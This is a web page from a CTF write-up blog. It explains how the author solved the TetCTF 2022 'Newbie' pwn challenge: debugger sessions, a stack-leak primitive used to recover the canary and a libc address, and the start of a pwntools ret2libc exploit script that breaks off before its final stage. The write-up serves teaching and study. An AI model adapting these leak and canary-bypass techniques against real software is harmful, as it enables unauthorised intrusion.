<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Newbie - Exploitation Freaks</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwntools-debugging.html"><strong aria-hidden="true">2.1.</strong> Pwntools Debugging</a></li><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.2.</strong> CVE-2015-3887</a></li><li class="chapter-item expanded "><a href="pwnkit.html"><strong aria-hidden="true">2.3.</strong> Deep Into Pwnkit - CVE-2021-4034</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.4.</strong> TetCTF 2022</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="newbie_tetctf.html" class="active"><strong aria-hidden="true">2.4.1.</strong> Newbie</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.5.</strong> Cyber Santa is Coming to Town</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="hackthebox-pwn-snowy.html"><strong aria-hidden="true">2.5.1.</strong> Mr Snowy</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-sleigh.html"><strong aria-hidden="true">2.5.2.</strong> Sleigh</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-naughty-list.html"><strong aria-hidden="true">2.5.3.</strong> Naughty List</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-minimelfistic.html"><strong aria-hidden="true">2.5.4.</strong> Minimelfistic</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.6.</strong> ROPEmporium</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="ropemporium-split.html"><strong aria-hidden="true">2.6.1.</strong> Split</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.7.</strong> NahamCon 2021</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="nahamcon_ret2basic.html"><strong aria-hidden="true">2.7.1.</strong> ret2basic</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.8.</strong> DownunderCTF 2020</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="return-to-what.html"><strong aria-hidden="true">2.8.1.</strong> return-to-what</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.9.</strong> Exploit.Education</div></li><li class="chapter-item expanded "><a href="exploit-education_stack-zero_arm.html"><strong aria-hidden="true">2.10.</strong> Stack-Zero (ARM64)</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><a href="gomalware-reversing-in-action.html"><strong aria-hidden="true">3.2.</strong> Go Malware Reverse Engineering with Kaspersky</a></li><li class="chapter-item expanded "><a href="license_checker_1.html"><strong aria-hidden="true">3.3.</strong> License Checker 0x01</a></li><li class="chapter-item expanded "><a href="license_checker_2.html"><strong aria-hidden="true">3.4.</strong> License Checker 0x02</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.5.</strong> BackdoorCTF 2013</div></li><li class="chapter-item expanded "><a href="binaary50.html"><strong aria-hidden="true">3.6.</strong> Binary 50</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Arizona State University Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-babyshell_level1.html"><strong aria-hidden="true">4.1.</strong> BabyShell Level 1</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-babyshell-level3.html"><strong aria-hidden="true">4.1.1.</strong> BabyShell Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level4.html"><strong aria-hidden="true">4.1.2.</strong> BabyShell Level 4</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level5.html"><strong aria-hidden="true">4.1.3.</strong> BabyShell Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level6.html"><strong aria-hidden="true">4.1.4.</strong> BabyShell Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level7.html"><strong aria-hidden="true">4.1.5.</strong> BabyShell Level 7</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level8.html"><strong aria-hidden="true">4.1.6.</strong> Babyshell Level 8</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-5.html"><strong aria-hidden="true">4.1.7.</strong> BabyReverse Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-10.html"><strong aria-hidden="true">4.1.8.</strong> BabyReverse Level 10</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-13.html"><strong aria-hidden="true">4.1.9.</strong> BabyReverse Level 13</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-15.html"><strong aria-hidden="true">4.1.10.</strong> BabyReverse Level 15</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-2.html"><strong aria-hidden="true">4.1.11.</strong> EmbryoGDB Level 2</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-3.html"><strong aria-hidden="true">4.1.12.</strong> EmbryoGDB Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-4.html"><strong aria-hidden="true">4.1.13.</strong> EmbryoGDB Level 4</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.2.</strong> Flare 8 (2021)</div></li><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">4.3.</strong> credchecker</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="flare-on_known.html"><strong aria-hidden="true">4.3.1.</strong> known</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.4.</strong> Flare 7 (2020)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="flare-on_garbage.html"><strong aria-hidden="true">4.4.1.</strong> garbage</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Programming</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">5.1.</strong> The Linux Programming Interface</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="programming-tee.html"><strong aria-hidden="true">5.1.1.</strong> Exercise 4.1 (reproducing the tee linux binary)</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Practical Binary Analysis Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">6.1.</strong> Chapter 1</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-1.html"><strong aria-hidden="true">6.1.1.</strong> The C Compilation Process</a></li><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-2.html"><strong aria-hidden="true">6.1.2.</strong> Symbols and Stripped Binaries</a></li><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-3.html"><strong aria-hidden="true">6.1.3.</strong> Disassembling a Binary</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">7.</strong> Networking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="mass-wificracking.html"><strong aria-hidden="true">7.1.</strong> Mass Wifi Cracking at Scale</a></li><li class="chapter-item expanded "><a href="half-handshake-crack.html"><strong aria-hidden="true">7.2.</strong> Half-Handshake Crack</a></li><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">7.3.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">7.4.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">7.5.</strong> RTL88x2bu Fake Access Point</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">8.1.</strong> Windows Cheatsheet</a></li><li class="chapter-item expanded "><a href="wireshark_weaponization.html"><strong aria-hidden="true">8.2.</strong> Wireshark Weaponization</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">9.</strong> HackTheBox</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="htb-paper.html"><strong aria-hidden="true">9.1.</strong> Paper</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">10.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="phone-opsec-tips.html"><strong aria-hidden="true">10.1.</strong> Phone Opsec Tips</a></li><li class="chapter-item expanded "><a href="irc.html"><strong aria-hidden="true">10.2.</strong> Join a IRC Server anonymously</a></li><li class="chapter-item expanded "><a href="docker.html"><strong aria-hidden="true">10.3.</strong> Docker Tricks</a></li><li class="chapter-item expanded "><a href="scan_faster.html"><strong aria-hidden="true">10.4.</strong> Quicker Port Scans with Masscan</a></li><li class="chapter-item expanded "><a href="bashfuscator.html"><strong aria-hidden="true">10.5.</strong> Bashfuscator</a></li><li class="chapter-item expanded "><a href="python_socketio.html"><strong aria-hidden="true">10.6.</strong> Python - Working with socket.io</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Exploitation Freaks</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="newbie---tetctf-2022"><a class="header" href="#newbie---tetctf-2022">Newbie - TeTCTF 2022</a></h1>
<p>This challenge was the first pwn challenge i did from the TeTCTF 2022 event, the challenge was an awesome ret2libc with a stack canary bypass.</p>
<p>Thanks to amon for the help on this one, he showed me how easy it was to leak the stack canary in the current binary context.</p>
<h2 id="looking-at-the-binary"><a class="header" href="#looking-at-the-binary">Looking at the binary</a></h2>
<p>So here's how the program works, it first read 10 bytes from <code>/dev/urandom</code> and store them in an 16 bits unsigned integer array.</p>
<p>Then the program start a loop in which it asks us for an input, we have multiple input choice here are the 3 choices we have : <code>id </code>, <code>create </code>, <code>quit </code>. </p>
<p>If we enter <code>id </code> the program we look for the next characters and calls <code>atoi</code> on them, this part is vulnerable and will allow us to leak values on the stack.</p>
<p>If we enter <code>create</code>, the program will generate a hash using 32 rand calls, the last value entered in id is used ass seed for our rand calls, this function will also be used to leak stack values.</p>
<p>If we enter <code>quit</code>, the program will quit and hit the return of the main function, this is the part vulnerable to a buffer overflow.</p>
<h2 id="finding-the-main-function-in-the-stripped-binary"><a class="header" href="#finding-the-main-function-in-the-stripped-binary">Finding the main function in the stripped binary</a></h2>
<p>The binary is stripped hence a little harder to find the main part of our program, here's how i found the main function.</p>
<p>I first started the program in gdb, ran it once to have the right addresses used, then use the <code>info file</code> to find the entry point of our binary.</p>
<p>I then put a breakpoint at this location, then i can run the program. The program breaks at our breakpoint and we can see a bit of the current function.</p>
<pre><code>pwndbg&gt; b *0x5555554009c0
pwndbg&gt; r
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
 ► 0x5555554009c0    xor    ebp, ebp
   0x5555554009c2    mov    r9, rdx
   0x5555554009c5    pop    rsi
   0x5555554009c6    mov    rdx, rsp
   0x5555554009c9    and    rsp, 0xfffffffffffffff0
   0x5555554009cd    push   rax
   0x5555554009ce    push   rsp
   0x5555554009cf    lea    r8, [rip + 0x4aa]
   0x5555554009d6    lea    rcx, [rip + 0x433]
   0x5555554009dd    lea    rdi, [rip + 0x3eb]
   0x5555554009e4    call   qword ptr [rip + 0x2015f6]    &lt;__libc_start_main&gt;
</code></pre>
<p>Looking at the DISASM output, we can notice that $rip+0x3eb is being put into rdi before the call to <code>__libc_start_main</code>, let's step until we're at address <code>0x5555554009dd</code> then disass the instructions at <code>$rip+0x3eb</code>.</p>
<pre><code>pwndbg&gt; x/10i $rip+0x3eb
   0x555555400dc8:      call   0x5555554008f0 &lt;__stack_chk_fail@plt&gt;
   0x555555400dcd:      leave  
   0x555555400dce:      ret    
   0x555555400dcf:      push   rbp
   0x555555400dd0:      mov    rbp,rsp
   0x555555400dd3:      sub    rsp,0x10
   0x555555400dd7:      mov    DWORD PTR [rbp-0x4],edi
   0x555555400dda:      mov    QWORD PTR [rbp-0x10],rsi
   0x555555400dde:      mov    eax,0x0
   0x555555400de3:      call   0x555555400b69

pwndbg&gt; b *0x555555400dcf
pwndbg&gt; del 1
</code></pre>
<p>Disassembling the instructions at ($rip+0x3eb, $rip+0x3eb+10) show us that the main function begins at address <code>0x555555400dcf</code>, so we put a breakpoint here and remove our older breakpoint.</p>
<p>We can then continue the program, we should hit the main function.</p>
<h2 id="starting-the-exploitation-of-the-program"><a class="header" href="#starting-the-exploitation-of-the-program">Starting the exploitation of the program</a></h2>
<p>Looking at RAX before the call to <code>create</code> at address <code>0x555555400bd1</code>, knowing that <code>id 0</code> correspond to the first 2 bytes we read from <code>/dev/urandom</code> we can see that these bytes are 0x779f</p>
<p>Let's search for these bytes somewhere on the stack.</p>
<pre><code>pwndbg&gt; search -t short 0x779f
[stack]		0x7fffffffdbf6 0x365b3b3fb0ef779f
</code></pre>
<p>We see that the value read inside <code>/dev/urandom</code> begins at address 0x7fffffffdbf6,</p>
<p>Looking at the values on the stack around the address 0x7fffffffdbf6.</p>
<pre><code>pwndbg&gt; x/32gx 0x7fffffffdbf6
0x7fffffffdbf6: 0x365b3b3fb0ef779f      0x6574616572633bf8
0x7fffffffdc06: 0x7ffff7e0de630000      0x0000000000140000
0x7fffffffdc16: 0x7ffff7f967600000      0x555555400f260000
0x7fffffffdc26: 0x7ffff7e0203a0000      0x0000000000000000
0x7fffffffdc36: 0x0000000000000000      0x0000000000000000
0x7fffffffdc46: 0x7fffffffdc800000      0x7fffffffdda80000
0x7fffffffdc56: 0x82bd5de3ae000000      0x7fffffffdc80e6fa
0x7fffffffdc66: 0x555555400dfe0000      0x7fffffffdda80000
0x7fffffffdc76: 0x0001000000010000      0x0000000000010000
0x7fffffffdc86: 0x7ffff7daafd00000      0x5555554000400000
0x7fffffffdc96: 0x555555400dcf0000      0x0001000000000000
0x7fffffffdca6: 0x7fffffffdda80000      0x0000000000000000
0x7fffffffdcb6: 0xd64dc4ec68470000      0x7fffffffdda8eb29
0x7fffffffdcc6: 0x555555400dcf0000      0x0000000000000000
0x7fffffffdcd6: 0x7ffff7ffbc400000      0x29b27dce68470000
0x7fffffffdce6: 0x39f89be6684714d6      0x7fff0000000014d6
</code></pre>
<p>We can see the bytes generated by <code>/dev/urandom</code> at address <code>0x7fffffffdbf6</code> are <code>0x365b3b3fb0ef779f</code>, and we know we are dealing with array of 16 bits each and we read 10 bytes in <code>/dev/urandom</code>, we can translate this string to the following.</p>
<pre><code>id 0: 0x779f
id 1: 0xb0ef
id 2: 0x3b3f
id 3: 0x365b
</code></pre>
<p>Note that we miss id 4, which should be the last 2 bytes of the address just before <code>0x7fffffffdbf6</code> which is the address we can find the value <code>0x365b3b3fb0ef779f</code> on the stack.</p>
<p>We can print the last 2 missing bytes using the following command inside pwndbg</p>
<pre><code>pwndbg&gt; x/32gx 0x7fffffffdbf6+2
0x7fffffffdbf8: 0x3bf8365b3b3fb0ef      0x0000657461657263
0x7fffffffdc08: 0x00007ffff7e0de63      0x0000000000000014
0x7fffffffdc18: 0x00007ffff7f96760      0x0000555555400f26
0x7fffffffdc28: 0x00007ffff7e0203a      0x0000000000000000
0x7fffffffdc38: 0x0000000000000000      0x0000000000000000
0x7fffffffdc48: 0x00007fffffffdc80      0x00007fffffffdda8
0x7fffffffdc58: 0xe6fa82bd5de3ae00      0x00007fffffffdc80
0x7fffffffdc68: 0x0000555555400dfe      0x00007fffffffdda8
0x7fffffffdc78: 0x0000000100000001      0x0000000000000001
0x7fffffffdc88: 0x00007ffff7daafd0      0x0000555555400040
0x7fffffffdc98: 0x0000555555400dcf      0x0000000100000000
0x7fffffffdca8: 0x00007fffffffdda8      0x0000000000000000
0x7fffffffdcb8: 0xeb29d64dc4ec6847      0x00007fffffffdda8
0x7fffffffdcc8: 0x0000555555400dcf      0x0000000000000000
0x7fffffffdcd8: 0x00007ffff7ffbc40      0x14d629b27dce6847
0x7fffffffdce8: 0x14d639f89be66847      0x00007fff00000000
</code></pre>
<p>Looking at the output  we can deduce that the last 2 missing bytes read from <code>/dev/urandom</code> are <code>0x3bf8</code>, we can then translate the whole value read from <code>/dev/urandom</code> to the following.</p>
<pre><code>id 0: 0x779f
id 1: 0xb0ef
id 2: 0x3b3f
id 3: 0x365b
id 4: 0x3bf8
</code></pre>
<p>We can confirm the following by continuing our program in the debugger and input <code>id 1</code> then break just before our call to <code>create</code> at address <code>0x555555400d80</code>.</p>
<pre><code>pwndbg&gt; b *0x555555400d80
Breakpoint 4 at 0x555555400d80
</code></pre>
<p>Then let's add another breakpoint right before the function that asks us for input at address <code>0x555555400d1a</code></p>
<pre><code>pwndbg&gt; x/30i $rip-200
   0x555555400cb3:      lea    edi,[rip+0x236]        # 0x555555400eef
   0x555555400cb9:      mov    eax,0x0
   0x555555400cbe:      call   0x555555400970 &lt;open@plt&gt;
   0x555555400cc3:      mov    DWORD PTR [rbp-0x70],eax
   0x555555400cc6:      cmp    DWORD PTR [rbp-0x70],0xffffffff
   0x555555400cca:      jne    0x555555400ce2
   0x555555400ccc:      lea    rdi,[rip+0x229]        # 0x555555400efc
   0x555555400cd3:      call   0x5555554008e0 &lt;puts@plt&gt;
   0x555555400cd8:      mov    edi,0x0
   0x555555400cdd:      call   0x555555400990 &lt;exit@plt&gt;
   0x555555400ce2:      lea    rcx,[rbp-0x6a]
   0x555555400ce6:      mov    eax,DWORD PTR [rbp-0x70]
   0x555555400ce9:      mov    edx,0xa
   0x555555400cee:      mov    rsi,rcx
   0x555555400cf1:      mov    edi,eax
   0x555555400cf3:      mov    eax,0x0
   0x555555400cf8:      call   0x555555400940 &lt;read@plt&gt;
   0x555555400cfd:      lea    rdi,[rip+0x1fe]        # 0x555555400f02
   0x555555400d04:      mov    eax,0x0
   0x555555400d09:      call   0x555555400910 &lt;printf@plt&gt;
   0x555555400d0e:      lea    rax,[rbp-0x60]
   0x555555400d12:      mov    esi,0x100
   0x555555400d17:      mov    rdi,rax
   0x555555400d1a:      call   0x555555400aca
   0x555555400d1f:      lea    rax,[rbp-0x60]
   0x555555400d23:      mov    edx,0x3
   0x555555400d28:      lea    rsi,[rip+0x1d6]        # 0x555555400f05
   0x555555400d2f:      mov    rdi,rax
   0x555555400d32:      call   0x5555554008d0 &lt;strncmp@plt&gt;
   0x555555400d37:      test   eax,eax

pwndbg&gt; b *0x555555400aca
</code></pre>
<p>Then we can continue and confirm that <code>id 1</code> is equal to <code>0xb0ef</code></p>
<pre><code>pwndbg&gt; c
pwndbg&gt; c 
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
   0x555555400d04    mov    eax, 0
   0x555555400d09    call   printf@plt                &lt;printf@plt&gt;
 
   0x555555400d0e    lea    rax, [rbp - 0x60]
   0x555555400d12    mov    esi, 0x100
   0x555555400d17    mov    rdi, rax
 ► 0x555555400d1a    call   0x555555400aca                &lt;0x555555400aca&gt;
 
   0x555555400d1f    lea    rax, [rbp - 0x60]
   0x555555400d23    mov    edx, 3
   0x555555400d28    lea    rsi, [rip + 0x1d6]
   0x555555400d2f    mov    rdi, rax
   0x555555400d32    call   strncmp@plt                &lt;strncmp@plt&gt;

pwndbg&gt; ni
id 1

pwndbg&gt; c
─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
   0x555555400d04    mov    eax, 0
   0x555555400d09    call   printf@plt                &lt;printf@plt&gt;
 
   0x555555400d0e    lea    rax, [rbp - 0x60]
   0x555555400d12    mov    esi, 0x100
   0x555555400d17    mov    rdi, rax
 ► 0x555555400d1a    call   0x555555400aca                &lt;0x555555400aca&gt;
 
   0x555555400d1f    lea    rax, [rbp - 0x60]
   0x555555400d23    mov    edx, 3
   0x555555400d28    lea    rsi, [rip + 0x1d6]
   0x555555400d2f    mov    rdi, rax
   0x555555400d32    call   strncmp@plt                &lt;strncmp@plt&gt;

pwndbg&gt; ni
create

pwndbg&gt; c
</code></pre>
<p>After this the program should have break at address <code>0x555555400d80</code> which is right before our call to <code>create</code> where we want to be.</p>
<p>Looking at eax show that we were right on our theory about how this program works.</p>
<pre><code>pwndbg&gt; i r eax
eax            0xb0ef              45295
</code></pre>
<h2 id="canaries"><a class="header" href="#canaries">Canaries</a></h2>
<p>Knowing we can leak 2 bytes from pretty much anywhere in our program, we can use this to leak the value of the stack canary and therefore bypass it easily.</p>
<pre><code>pwndbg&gt; canary
AT_RANDOM = 0x7fffffffe119 # points to (not masked) global canary value
Canary    = 0xe6fa82bd5de3ae00 (may be incorrect on != glibc)
Found valid canaries on the stacks:
00:0000│  0x7fffffffd988 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffda48 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffda58 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdaa8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdab8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdac8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdb18 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdbc8 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdc58 ◂— 0xe6fa82bd5de3ae00
00:0000│  0x7fffffffdd18 ◂— 0xe6fa82bd5de3ae00
</code></pre>
<p>We can notice that valid canaries have the value <code>0xe6fa82bd5de3ae00</code> <em>note that this value change every time we run the program</em>, and we are looking particularly for one that is located after our <code>/dev/urandom bytes buffer</code> at address <code>0x7fffffffdbf6</code>, the reason why is that our input is treated as a unsigned integer which means we can't use any negative offsets.</p>
<p>We can use the stack canary that is located at address <code>0x7fffffffdc58</code> which is located after our buffer on the stack (0x7fffffffdc58 - 0x7fffffffdbf6 = 98).</p>
<p>We have 98 bytes of offset between the beginning of our canary and our <code>10 bytes</code> we read out of <code>/dev/urandom</code></p>
<p>Since we're dealing with nibbles, we are going to need to split our bytes in offset by 2 which give us a final offset of <code>49</code></p>
<p>We are also going to need to leak something from libc, something we know that is definitely on the stack is the return address back into <code>__libc_start_main</code> from the <code>main</code> function. Searching for it tells us that it is at the stack address <code>0x7fffffffdc88</code> on the stack.</p>
<pre><code>pwndbg&gt; bt
#0  0x0000555555400d80 in ?? ()
#1  0x0000555555400dfe in ?? ()
#2  0x00007ffff7daafd0 in __libc_start_call_main (main=main@entry=0x555555400dcf, argc=argc@entry=1, argv=argv@entry=0x7fffffffdda8) at ../sysdeps/nptl/libc_start_call_main.h:58
#3  0x00007ffff7dab07d in __libc_start_main_impl (main=0x555555400dcf, argc=1, argv=0x7fffffffdda8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdd98) at ../csu/libc-start.c:409
#4  0x00005555554009ea in ?? ()

pwndbg&gt; search -t qword 0x00007ffff7daafd0
[stack]         0x7fffffffdc88 0x7ffff7daafd0
</code></pre>
<p>We can now calculate the offset between the return address of <code>__libc_start_main</code> and our 10 bytes read from <code>/dev/urandom</code> the same way we did with canaries (0x7fffffffdc88 - 0x7fffffffdbf6 = 146).</p>
<p>Once again since we're dealing with <code>16 bits unsigned integer</code> we are going to need to split this value by 2, which will give us the final offset of <code>73</code>.</p>
<p>Now that we leak our canary we should be able to determine the offset of rip where our program crashes.</p>
<h2 id="writing-exploit"><a class="header" href="#writing-exploit">Writing Exploit</a></h2>
<p>With all the knowledge we've gained on this binary so far we should be ready to write an exploit script.</p>
<pre><code class="language-py">from pwn import *
import ctypes
from one_gadget import generate_one_gadget

charset = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;
stack_canary_offset = 49 # This is the offset we've obtained for the canary we choosed on the stack
stack___libc_start_main_offset = 73 # Since we need to leak something from libc we can leak the return address back into __libc_start_main from the main function
hashes = {} # We compute every possible hashes (65535) and add them to this array

# This function will leak the value at our offset argument.
def leak(p, offset, toggle=True):
    p.recvuntil(b&quot;&gt; &quot;)
    p.sendline(b&quot;id &quot; + str(offset).encode())
    p.recvuntil(b&quot;&gt; &quot;)
    p.sendline(b&quot;create&quot;)
    p.recvuntil(b&quot;Your key: &quot;)
    key = p.recvline().strip().decode()
    value = hashes[key]
    # correct for the one and zero collision.
    if value == 1 and toggle:
        value = 0
    
    log.info(f&quot;Offset {offset}: {key} ({hex(value)})&quot;)
    return value


# The function precompute will precompute every possible 2 bytes values that we read from /dev/urandom
def precompute():
    libc = ctypes.cdll.LoadLibrary(&quot;libc.so.6&quot;)
    global hashes
    # loop in all 2 bytes possibilities (0x0000, 0xffff), this will generate all possibilities generated by /dev/urandom
    for i in range(0xffff+1):
        libc.srand(i)
        val = &quot;&quot;
        for j in range(32):
            val += charset[libc.rand() % len(charset)]
        hashes[val] = i
    log.info(f&quot;Computed {len(hashes)} hashes.&quot;)

def main():
    precompute()

    # Find themagicone gadget in the provided libc
